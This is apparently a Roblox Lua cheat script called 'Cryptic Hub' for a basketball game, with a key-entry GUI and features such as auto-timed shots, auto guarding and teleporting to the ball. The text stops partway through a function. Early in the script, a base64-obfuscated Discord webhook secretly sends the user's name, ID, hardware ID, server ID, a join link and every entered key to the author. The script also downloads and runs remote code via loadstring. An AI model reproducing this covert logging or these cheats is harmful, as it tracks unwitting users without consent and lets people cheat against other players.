local KEY_SITE_URL = "https://work.ink/29F5/basketball-key"
local SAVE_FILE = "crypticsaved_key.txt"
local MAX_RETRIES = 5
local RETRY_DELAY = 1
local REQUEST_TIMEOUT = 3

-- ==================== WEBHOOK LOGGER SETUP ====================
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local playerName = player.Name
local playerUserId = tostring(player.UserId)
local shortServerId = string.sub(game.JobId, 1, 8)

local base64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MzgwMzQzNjU4MjgzNDI3Ni9neDYyVEM2VjVESE96ODBxNi03bENSS0NoMmVZMEVQVm9ZYy1YcnNSd2pkQW9wS2R3VU9hc2RVTTlsS0Yydy1VX3E4Wg=="

local function base64Decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local webhookUrl = base64Decode(base64)

local httpRequest = http_request or request or syn.request or (http and http.request) or fluxus and fluxus.request

if not httpRequest then
    warn("‚ö†Ô∏è HTTP request function not available - logging disabled")
end

local function getHWID()
    if gethwid then
        return gethwid()
    elseif syn and syn.request then
        return "Synapse-" .. playerUserId
    elseif getexecutorname then
        return getexecutorname() .. "-" .. playerUserId
    else
        return "Unknown-" .. playerUserId
    end
end

local playerHWID = getHWID()

local function logAction(action, details, isError)
    if not httpRequest then return end
    
    local color = 16753920
    if isError then
        color = 16711680
    elseif action:find("Success") or action:find("‚úÖ") then
        color = 65280
    end

    local embed = {
        ["title"] = "üìú " .. action,
        ["description"] = "```" .. details .. "```",
        ["color"] = color,
        ["fields"] = {
            {["name"] = "üë§ Player", ["value"] = playerName .. " (`" .. playerUserId .. "`)", ["inline"] = true},
            {["name"] = "üîë HWID", ["value"] = "`" .. playerHWID .. "`", ["inline"] = true},
            {["name"] = "üåê Server", ["value"] = "`" .. shortServerId .. "`", ["inline"] = true},
            {["name"] = "üéÆ Game", ["value"] = "`" .. tostring(game.PlaceId) .. "`", ["inline"] = true},
            {["name"] = "‚öôÔ∏è Executor", ["value"] = "`" .. (identifyexecutor() or "Unknown") .. "`", ["inline"] = true},
        },
        ["footer"] = {
            ["text"] = "‚è∞ " .. os.date("%Y-%m-%d %H:%M:%S")
        }
    }

    local data = {
        ["username"] = "Cryptic Hub Logger",
        ["embeds"] = {embed},
        ["avatar_url"] = "https://i.imgur.com/Jqx7M2i.png"
    }

    local jsonData = HttpService:JSONEncode(data)

    task.spawn(function()
        pcall(function()
            httpRequest({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
    end)
end

logAction("üöÄ Script Initialized", 
[[Player: ]] .. playerName .. [[ (]] .. playerUserId .. [[)
HWID: ]] .. playerHWID .. [[
Server: ]] .. shortServerId .. [[
Game: ]] .. game.PlaceId .. [[
Executor: ]] .. (identifyexecutor() or "Unknown") .. [[
üîó Join Link: ]] .. string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", game.PlaceId, game.JobId) .. [[
]], false)

-- ==================== END WEBHOOK LOGGER ====================

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "KeySystemGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = game:GetService("CoreGui")

-- Blur effect for background
local blur = Instance.new("BlurEffect")
blur.Size = 5
blur.Parent = game:GetService("Lighting")

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 350, 0, 490)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)  -- Center the frame
mainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 20)
mainCorner.Parent = mainFrame

local shadowStroke = Instance.new("UIStroke")
shadowStroke.Color = Color3.fromRGB(100, 100, 255)
shadowStroke.Thickness = 1
shadowStroke.Transparency = 0.6
shadowStroke.Parent = mainFrame

local shadowGradient = Instance.new("UIGradient")
shadowGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 43, 226)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(75, 0, 130)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(138, 43, 226))
}
shadowGradient.Rotation = 45
shadowGradient.Parent = shadowStroke

-- Animated gradient overlay
local gradientOverlay = Instance.new("Frame")
gradientOverlay.Size = UDim2.new(1, 0, 0, 4)
gradientOverlay.Position = UDim2.new(0, 0, 0, 0)
gradientOverlay.BackgroundTransparency = 0
gradientOverlay.BorderSizePixel = 0
gradientOverlay.ZIndex = 2
gradientOverlay.Parent = mainFrame

local overlayCorner = Instance.new("UICorner")
overlayCorner.CornerRadius = UDim.new(0, 20)
overlayCorner.Parent = gradientOverlay

local overlayGradient = Instance.new("UIGradient")
overlayGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 43, 226)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(75, 0, 130)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(138, 43, 226))
}
overlayGradient.Rotation = 0
overlayGradient.Parent = gradientOverlay

game:GetService("RunService").Heartbeat:Connect(function()
    if overlayGradient then
        overlayGradient.Rotation = (overlayGradient.Rotation + 0.5) % 360
    end
end)

local headerFrame = Instance.new("Frame")
headerFrame.Size = UDim2.new(1, 0, 0, 120)
headerFrame.BackgroundTransparency = 1
headerFrame.BorderSizePixel = 0
headerFrame.Parent = mainFrame

-- Icon/Logo
local iconLabel = Instance.new("TextLabel")
iconLabel.Size = UDim2.new(0, 60, 0, 60)
iconLabel.Position = UDim2.new(0.5, -30, 0, 20)
iconLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
iconLabel.BorderSizePixel = 0
iconLabel.Text = "üîê"
iconLabel.TextScaled = true
iconLabel.Font = Enum.Font.GothamBold
iconLabel.Parent = headerFrame

local iconCorner = Instance.new("UICorner")
iconCorner.CornerRadius = UDim.new(1, 0)
iconCorner.Parent = iconLabel

local iconStroke = Instance.new("UIStroke")
iconStroke.Color = Color3.fromRGB(138, 43, 226)
iconStroke.Thickness = 2
iconStroke.Transparency = 0.3
iconStroke.Parent = iconLabel

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -40, 0, 35)
titleLabel.Position = UDim2.new(0, 20, 0, 80)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Cryptic Hub"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 28
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextXAlignment = Enum.TextXAlignment.Center
titleLabel.Parent = headerFrame

local titleGradient = Instance.new("UIGradient")
titleGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 150, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
}
titleGradient.Rotation = 90
titleGradient.Parent = titleLabel

local subtitleLabel = Instance.new("TextLabel")
subtitleLabel.Size = UDim2.new(1, -40, 0, 20)
subtitleLabel.Position = UDim2.new(0, 20, 0, 110)
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Text = "Free Access ‚Ä¢ 12 Hour Keys"
subtitleLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
subtitleLabel.TextSize = 13
subtitleLabel.Font = Enum.Font.Gotham
subtitleLabel.TextXAlignment = Enum.TextXAlignment.Center
subtitleLabel.Parent = headerFrame

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 40, 0, 40)
closeButton.Position = UDim2.new(1, -50, 0, 15)
closeButton.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
closeButton.BorderSizePixel = 0
closeButton.Text = "x"
closeButton.TextColor3 = Color3.fromRGB(220, 220, 230)
closeButton.TextSize = 20
closeButton.Font = Enum.Font.GothamBold
closeButton.ZIndex = 3
closeButton.Parent = mainFrame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(1, 0)
closeCorner.Parent = closeButton

local closeStroke = Instance.new("UIStroke")
closeStroke.Color = Color3.fromRGB(50, 50, 65)
closeStroke.Thickness = 1
closeStroke.Transparency = 0.5
closeStroke.Parent = closeButton

closeButton.MouseEnter:Connect(function()
    game:GetService("TweenService"):Create(closeButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(220, 50, 80)
    }):Play()
end)

closeButton.MouseLeave:Connect(function()
    game:GetService("TweenService"):Create(closeButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    }):Play()
end)

-- Reorganized content structure with dedicated loading area at top
local contentFrame = Instance.new("Frame")
contentFrame.Size = UDim2.new(1, -50, 1, -220)
contentFrame.Position = UDim2.new(0, 25, 0, 130)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = mainFrame

-- Loading frame at top (only visible when validating)
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(1, 0, 0, 80)
loadingFrame.Position = UDim2.new(0, 0, 0, 0)
loadingFrame.BackgroundTransparency = 1
loadingFrame.Visible = false
loadingFrame.ZIndex = 10
loadingFrame.Parent = contentFrame

local loadingSpinner = Instance.new("ImageLabel")
loadingSpinner.Size = UDim2.new(0, 50, 0, 50)
loadingSpinner.Position = UDim2.new(0.5, -25, 0, 5)
loadingSpinner.BackgroundTransparency = 1
loadingSpinner.Image = "rbxasset://textures/loading/robloxTilt.png"
loadingSpinner.ImageColor3 = Color3.fromRGB(138, 43, 226)
loadingSpinner.Parent = loadingFrame

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0, 20)
loadingText.Position = UDim2.new(0, 0, 0, 55)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Verifying key..."
loadingText.TextColor3 = Color3.fromRGB(200, 150, 255)
loadingText.TextSize = 12
loadingText.Font = Enum.Font.Gotham
loadingText.TextXAlignment = Enum.TextXAlignment.Center
loadingText.Parent = loadingFrame

local spinTween = game:GetService("TweenService"):Create(
	loadingSpinner,
	TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1),
	{Rotation = 360}
)

-- Input frame
local inputFrame = Instance.new("Frame")
inputFrame.Size = UDim2.new(1, 0, 0, 55)
inputFrame.Position = UDim2.new(0, 0, 0, 85)
inputFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
inputFrame.BorderSizePixel = 0
inputFrame.Parent = contentFrame

local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 12)
inputCorner.Parent = inputFrame

local inputStroke = Instance.new("UIStroke")
inputStroke.Color = Color3.fromRGB(50, 50, 70)
inputStroke.Thickness = 1.5
inputStroke.Transparency = 0.5
inputStroke.Parent = inputFrame

local keyInput = Instance.new("TextBox")
keyInput.Size = UDim2.new(1, -30, 1, 0)
keyInput.Position = UDim2.new(0, 15, 0, 0)
keyInput.BackgroundTransparency = 1
keyInput.Text = ""
keyInput.PlaceholderText = "Enter your premium key..."
keyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
keyInput.PlaceholderColor3 = Color3.fromRGB(100, 100, 120)
keyInput.TextSize = 15
keyInput.Font = Enum.Font.Gotham
keyInput.TextXAlignment = Enum.TextXAlignment.Left
keyInput.Parent = inputFrame

keyInput.Focused:Connect(function()
    game:GetService("TweenService"):Create(inputStroke, TweenInfo.new(0.3), {
        Color = Color3.fromRGB(138, 43, 226),
        Transparency = 0
    }):Play()
end)

keyInput.FocusLost:Connect(function(enterPressed)
    game:GetService("TweenService"):Create(inputStroke, TweenInfo.new(0.3), {
        Color = Color3.fromRGB(50, 50, 70),
        Transparency = 0.5
    }):Play()
    if enterPressed and not keyValidated then
        validateKey(keyInput.Text)
    end
end)

-- Status label now positioned below input with clear separation
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, 0, 0, 25)
statusLabel.Position = UDim2.new(0, 0, 0, 145)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "‚Ä¢ Ready to verify your key"
statusLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
statusLabel.TextSize = 13
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.TextYAlignment = Enum.TextYAlignment.Center
statusLabel.Parent = contentFrame

-- Link label with improved spacing and styling
local linkLabel = Instance.new("TextLabel")
linkLabel.Size = UDim2.new(1, 0, 0, 50)
linkLabel.Position = UDim2.new(0, 0, 0, 175)
linkLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
linkLabel.BorderSizePixel = 0
linkLabel.Text = KEY_SITE_URL
linkLabel.TextColor3 = Color3.fromRGB(138, 43, 226)
linkLabel.TextSize = 12
linkLabel.Font = Enum.Font.GothamBold
linkLabel.TextWrapped = true
linkLabel.TextYAlignment = Enum.TextYAlignment.Center
linkLabel.Parent = contentFrame

local linkCorner = Instance.new("UICorner")
linkCorner.CornerRadius = UDim.new(0, 8)
linkCorner.Parent = linkLabel

local linkStroke = Instance.new("UIStroke")
linkStroke.Color = Color3.fromRGB(50, 50, 70)
linkStroke.Thickness = 1
linkStroke.Transparency = 0.5
linkStroke.Parent = linkLabel

-- Buttons positioned at bottom with proper spacing
local buttonFrame = Instance.new("Frame")
buttonFrame.Size = UDim2.new(1, 0, 0, 52)
buttonFrame.Position = UDim2.new(0, 0, 0, 230)
buttonFrame.BackgroundTransparency = 1
buttonFrame.Parent = contentFrame

local submitButton = Instance.new("TextButton")
submitButton.Size = UDim2.new(0.48, 0, 1, 0)
submitButton.Position = UDim2.new(0, 0, 0, 0)
submitButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
submitButton.BorderSizePixel = 0
submitButton.Text = "Verify Key"
submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
submitButton.TextSize = 15
submitButton.Font = Enum.Font.GothamBold
submitButton.Parent = buttonFrame

local submitCorner = Instance.new("UICorner")
submitCorner.CornerRadius = UDim.new(0, 10)
submitCorner.Parent = submitButton

local submitGradient = Instance.new("UIGradient")
submitGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 43, 226)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(75, 0, 130))
}
submitGradient.Rotation = 45
submitGradient.Parent = submitButton

submitButton.MouseEnter:Connect(function()
    game:GetService("TweenService"):Create(submitButton, TweenInfo.new(0.2), {
        Size = UDim2.new(0.48, 0, 1, 4)
    }):Play()
end)

submitButton.MouseLeave:Connect(function()
    game:GetService("TweenService"):Create(submitButton, TweenInfo.new(0.2), {
        Size = UDim2.new(0.48, 0, 1, 0)
    }):Play()
end)

local getKeyButton = Instance.new("TextButton")
getKeyButton.Size = UDim2.new(0.48, 0, 1, 0)
getKeyButton.Position = UDim2.new(0.52, 0, 0, 0)
getKeyButton.BackgroundColor3 = Color3.fromRGB(30, 30, 42)
getKeyButton.BorderSizePixel = 0
getKeyButton.Text = "Get Key"
getKeyButton.TextColor3 = Color3.fromRGB(200, 150, 255)
getKeyButton.TextSize = 15
getKeyButton.Font = Enum.Font.GothamBold
getKeyButton.Parent = buttonFrame

local getKeyCorner = Instance.new("UICorner")
getKeyCorner.CornerRadius = UDim.new(0, 10)
getKeyCorner.Parent = getKeyButton

local getKeyStroke = Instance.new("UIStroke")
getKeyStroke.Color = Color3.fromRGB(138, 43, 226)
getKeyStroke.Thickness = 1.5
getKeyStroke.Transparency = 0.4
getKeyStroke.Parent = getKeyButton

getKeyButton.MouseEnter:Connect(function()
    game:GetService("TweenService"):Create(getKeyButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(40, 40, 55),
        Size = UDim2.new(0.48, 0, 1, 4)
    }):Play()
    game:GetService("TweenService"):Create(getKeyStroke, TweenInfo.new(0.2), {
        Transparency = 0
    }):Play()
end)

getKeyButton.MouseLeave:Connect(function()
    game:GetService("TweenService"):Create(getKeyButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(30, 30, 42),
        Size = UDim2.new(0.48, 0, 1, 0)
    }):Play()
    game:GetService("TweenService"):Create(getKeyStroke, TweenInfo.new(0.2), {
        Transparency = 0.4
    }):Play()
end)

local keyValidated = false
local guiClosed = false

local function updateStatus(message, color)
	statusLabel.Text = "‚Ä¢ " .. message
	statusLabel.TextColor3 = color or Color3.fromRGB(140, 140, 160)
	loadingText.Text = message
end

local function saveKey(key)
	if writefile then
		pcall(function()
			writefile(SAVE_FILE, key)
		end)
	end
end

local function loadSavedKey()
	if readfile and isfile and isfile(SAVE_FILE) then
		local success, key = pcall(function()
			return readfile(SAVE_FILE)
		end)
		if success then
			return key
		end
	end
	return nil
end

local function validateKey(keyText)
	if keyText == "" then
		updateStatus("Please enter a key", Color3.fromRGB(255, 150, 80))
		return
	end

	logAction("üîë Key Entered", "User entered key: `" .. keyText .. "`", false)

	loadingFrame.Visible = true
	spinTween:Play()
	submitButton.Text = "Validating..."
	submitButton.Interactable = false
	updateStatus("Verifying key authenticity...", Color3.fromRGB(200, 150, 255))

	task.spawn(function()
		for attempt = 1, MAX_RETRIES do
			updateStatus(
				string.format("Validating... (%d/%d)", attempt, MAX_RETRIES),
				Color3.fromRGB(200, 150, 255)
			)

			local completed = false
			local success = false
			local response = nil

			task.spawn(function()
				local s, r = pcall(function()
					return game:HttpGetAsync("https://work.ink/_api/v2/token/isValid/" .. keyText)
				end)
				success = s
				response = r
				completed = true
			end)

			local waited = 0
			while not completed and waited < REQUEST_TIMEOUT do
				task.wait(0.1)
				waited = waited + 0.1
			end

			if completed and success and response then
				local decoded
				local decodeSuccess = pcall(function()
					decoded = game:GetService("HttpService"):JSONDecode(response)
				end)

				if decodeSuccess and decoded and decoded.valid == true then
					keyValidated = true
					saveKey(keyText)
					loadingFrame.Visible = false
					spinTween:Cancel()
					updateStatus("Key verified successfully!", Color3.fromRGB(100, 255, 150))
					submitButton.Text = "‚úì Access Granted"
					submitButton.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
					
					logAction("‚úÖ Key Validated Successfully", 
						"Key: `" .. keyText .. "`\nStatus: Valid and accepted", 
						false)
					
					task.wait(1.5)
					blur:Destroy()
					screenGui:Destroy()
					return
				end
			end

			if attempt < MAX_RETRIES then
				task.wait(RETRY_DELAY)
			end
		end

		loadingFrame.Visible = false
		spinTween:Cancel()
		submitButton.Text = "Verify Key"
		submitButton.Interactable = true
		updateStatus("Invalid key or connection error", Color3.fromRGB(255, 100, 120))

		logAction("‚ùå Key Validation Failed", 
			"Key: `" .. keyText .. "`\nStatus: Invalid or connection error", 
			true)
	end)
end

submitButton.Activated:Connect(function()
	if not guiClosed and keyValidated == false then
		validateKey(keyInput.Text)
	end
end)

getKeyButton.Activated:Connect(function()
	if setclipboard then
		setclipboard(KEY_SITE_URL)
		updateStatus("Link copied to clipboard!", Color3.fromRGB(100, 200, 255))
		getKeyButton.Text = "‚úì Copied!"
		task.delay(2, function()
			getKeyButton.Text = "Get Key"
		end)
	end
end)

closeButton.Activated:Connect(function()
	guiClosed = true
	logAction("‚ùå Key System Closed", "User closed key system without validation", true)
	blur:Destroy()
	screenGui:Destroy()
end)

local savedKey = loadSavedKey()
if savedKey then
	keyInput.Text = savedKey
	task.delay(0.5, function()
		validateKey(savedKey)
	end)
end

repeat
	task.wait()
until keyValidated or guiClosed

if not keyValidated then
	print("Closed without key verification")
	return
end

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")

local cloneref = cloneref or function(v) return v end
local player = Players.LocalPlayer
local Char = player.Character or player.CharacterAdded:Wait()
local Hum = cloneref(Char:WaitForChild("Humanoid")) or cloneref(Char:FindFirstChild("Humanoid"))
local Hrp = cloneref(Char:WaitForChild("HumanoidRootPart")) or cloneref(Char:FindFirstChild("HumanoidRootPart"))

local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()

local Options = Library.Options
local Toggles = Library.Toggles

local Window = Library:CreateWindow({
    Title = "Cryptic Hub",
    Footer = "by @dr1ft3dd | https://discord.gg/YdS7JBUV5j",
    NotifySide = "Right",
    ShowCustomCursor = false,
})

local Tabs = {
    Main = Window:AddTab("Main", "house"),
    Player = Window:AddTab("Player", "user"),
    Misc = Window:AddTab("Misc", "settings"),
    ["UI Settings"] = Window:AddTab("UI Settings", "monitor"),
}

local function IsPark()
    if workspace:WaitForChild("Game"):FindFirstChild("Courts") then
        return true
    else
        return false
    end
end

local isPark = IsPark()
local ShootingGroup = Tabs.Main:AddLeftGroupbox("Auto Shooting", "target")
local GuardGroup = Tabs.Main:AddRightGroupbox("Auto Guard", "shield")
local ReboundGroup = Tabs.Main:AddLeftGroupbox("Auto Rebound & Steal", "backpack")
local SpeedGroup = Tabs.Player:AddLeftGroupbox("Speed Boost", "zap")
local MiscGroup = Tabs.Misc:AddLeftGroupbox("Visuals", "eye")
local AnimationGroup = Tabs.Misc:AddRightGroupbox("Animation Changer", "play")
local MenuGroup = Tabs["UI Settings"]:AddLeftGroupbox("Menu", "wrench")

local visualGui = player.PlayerGui:WaitForChild("Visual")
local shootingElement = visualGui:WaitForChild("Shooting")
local Shoot = ReplicatedStorage.Packages.Knit.Services.ControlService.RE.Shoot

local autoShootEnabled = false
local autoGuardEnabled = false
local autoGuardToggleEnabled = false
local holdingG = false
local speedBoostEnabled = false

local desiredSpeed = 30
local predictionTime = 0.3
local guardDistance = 10
local shootPower = 0.8

local visibleConn = nil
local autoGuardConnection = nil
local speedBoostConnection = nil
local lastPositions = {}

ShootingGroup:AddToggle("AutoShoot", {
    Text = "Auto Time",
    Default = false,
    Tooltip = "Automatically shoots with perfect timing",
    Callback = function(value)
        autoShootEnabled = value
        if autoShootEnabled then
            if not visibleConn then
                visibleConn = shootingElement:GetPropertyChangedSignal("Visible"):Connect(function()
                    if autoShootEnabled and shootingElement.Visible == true then
                        task.wait(0.25)
                        Shoot:FireServer(shootPower)
                    end
                end)
            end
        else
            if visibleConn then
                visibleConn:Disconnect()
                visibleConn = nil
            end
        end
    end
})

ShootingGroup:AddSlider("ShootTiming", {
    Text = "Shot Timing",
    Default = 80,
    Min = 50,
    Max = 100,
    Rounding = 0,
    Tooltip = "Adjust the timing of the shot (80 = Mediocre, 90 = Good, 95 = Great, 100 = Perfect)",
    Callback = function(value)
        shootPower = value / 100
    end
})

ShootingGroup:AddLabel("Shot Timing Guide:\n80 = Mediocre\n90 = Good\n95 = Great\n100 = Perfect", true)

local function getPlayerFromModel(model)
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Character == model then
            return plr
        end
    end
    return nil
end

local function isOnDifferentTeam(otherModel)
    local otherPlayer = getPlayerFromModel(otherModel)
    if not otherPlayer then return false end
    
    if not player.Team or not otherPlayer.Team then
        return otherPlayer ~= player
    end
    
    return player.Team ~= otherPlayer.Team
end

local function findPlayerWithBall()
    if isPark then
        local closestPlayer = nil
        local closestDistance = math.huge

        for _, model in pairs(workspace:GetChildren()) do
            if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") and model ~= player.Character then
                local tool = model:FindFirstChild("Basketball")
                if tool and tool:IsA("Tool") then
                    local hrp = model.HumanoidRootPart
                    local dist = (hrp.Position - player.Character.HumanoidRootPart.Position).Magnitude
                    if dist < closestDistance then
                        closestDistance = dist
                        closestPlayer = model
                    end
                end
            end
        end

        if closestPlayer then
            return closestPlayer, closestPlayer:FindFirstChild("HumanoidRootPart")
        end

        return nil, nil
    end

    local looseBall = workspace:FindFirstChild("Basketball")
    if looseBall and looseBall:IsA("BasePart") then
        local closestPlayer = nil
        local closestDistance = math.huge
        
        for _, model in pairs(workspace:GetChildren()) do
            if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") and model ~= player.Character then
                if isOnDifferentTeam(model) then
                    local rootPart = model:FindFirstChild("HumanoidRootPart")
                    local distance = (looseBall.Position - rootPart.Position).Magnitude
                    
                    if distance < closestDistance and distance < 15 then
                        closestDistance = distance
                        closestPlayer = model
                    end
                end
            end
        end
        
        if closestPlayer then
            return closestPlayer, closestPlayer:FindFirstChild("HumanoidRootPart")
        end
    end
    
    for _, model in pairs(workspace:GetChildren()) do
        if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") and model ~= player.Character then
            if isOnDifferentTeam(model) then
                local humanoidRootPart = model:FindFirstChild("HumanoidRootPart")
                local basketball = model:FindFirstChild("Basketball")
                
                if basketball and basketball:IsA("Tool") then
                    return model, humanoidRootPart
                end
            end
        end
    end
    
    return nil, nil
end

local function autoGuard()
    if not autoGuardEnabled then return end
    if Players.LocalPlayer:FindFirstChild("Basketball") then return end
    
    local character = player.Character
    if not character then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not rootPart then return end
    
    local ballCarrier, ballCarrierRoot = findPlayerWithBall()
    
    if ballCarrier and ballCarrierRoot then
        local distance = (rootPart.Position - ballCarrierRoot.Position).Magnitude
        local currentPos = ballCarrierRoot.Position
        local velocity = Vector3.new(0, 0, 0)
        
        if lastPositions[ballCarrier] then
            velocity = (currentPos - lastPositions[ballCarrier]) / task.wait()
        end
        lastPositions[ballCarrier] = currentPos
        
        local predictedPos = currentPos + (velocity * predictionTime * 60)
        local directionToOpponent = (predictedPos - rootPart.Position).Unit
        local defensiveOffset = directionToOpponent * 5
        local defensivePosition = predictedPos - defensiveOffset
        
        defensivePosition = Vector3.new(defensivePosition.X, rootPart.Position.Y, defensivePosition.Z)
        
        if distance <= guardDistance then
            humanoid:MoveTo(defensivePosition)
            
            local VirtualInputManager = game:GetService("VirtualInputManager")
            if distance <= 10 then
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)
            else
                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.F, false, game)
            end
        else
            local VirtualInputManager = game:GetService("VirtualInputManager")
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.F, false, game)
        end
    else
        local VirtualInputManager = game:GetService("VirtualInputManager")
        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.F, false, game)
    end
end

GuardGroup:AddToggle("AutoGuard", {
    Text = "Auto Guard",
    Default = false,
    Tooltip = "Enable auto guard feature (hold G to activate)",
    Callback = function(value)
        autoGuardToggleEnabled = value
        
        if not value then
            autoGuardEnabled = false
            if autoGuardConnection then
                autoGuardConnection:Disconnect()
                autoGuardConnection = nil
            end
            
            lastPositions = {}
            
            local VirtualInputManager = game:GetService("VirtualInputManager")
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.F, false, game)
        end
    end
})

local teleportEnabled = false
local offsetDistance = 3 

RunService.RenderStepped:Connect(function()
    if not teleportEnabled then return end
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local closestBall
    local closestDist = math.huge
    local maxDistance = isPark and 100 or math.huge

    for _, child in ipairs(workspace:GetChildren()) do
        if child.Name == "Basketball" then
            local part = child:IsA("BasePart") and child or child:FindFirstChildWhichIsA("BasePart")
            if part then
                local dist = (part.Position - hrp.Position).Magnitude
                if dist < closestDist and dist <= maxDistance then
                    closestDist = dist
                    closestBall = part
                end
            end
        end
    end

    if closestBall then
        local targetPosition = closestBall.Position + closestBall.CFrame.LookVector * offsetDistance
        hrp.CFrame = CFrame.new(targetPosition)
    end
end)

local function toggleTeleport()
    teleportEnabled = not teleportEnabled
end

ReboundGroup:AddToggle("ReboundAutoSteal", {
    Text = "Auto Rebound & Steal",
    Default = false,
    Tooltip = "Will automatically rebound and steal the ball",
    Callback = function(enabled)
        toggleTeleport(enabled) 
    end
})
:AddKeyPicker("ReboundAutoStealKey", {
    Default = "T",
    SyncToggleState = true,
    Mode = "Toggle",
    Text = "Auto Rebound & Steal Key",
    Callback = function(active)
        ReboundGroup:SetToggle("ReboundAutoSteal", active)
    end
})

ReboundGroup:AddSlider("Offset distance", {
    Text = "Rebound & Steal offset distance",
    Default = 0,
    Min = 0,
    Max = 6,
    Rounding = 1,
    Tooltip = "how far ahead of the basketball you will be teleported to",
    Callback = function(value)
        offsetDistance = value
    end
})

local FollowBallCarrierGroup = Tabs.Main:AddLeftGroupbox("Follow Ball Carrier", "users")

local followEnabled = false
local followConnection = nil
local followOffset = 3

local function enableFollowBallCarrier()
    if followEnabled then return end
    followEnabled = true
    
    followConnection = RunService.Heartbeat:Connect(function()
        if not followEnabled then return end
        
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        
        local ballCarrier, ballCarrierRoot = findPlayerWithBall()
        
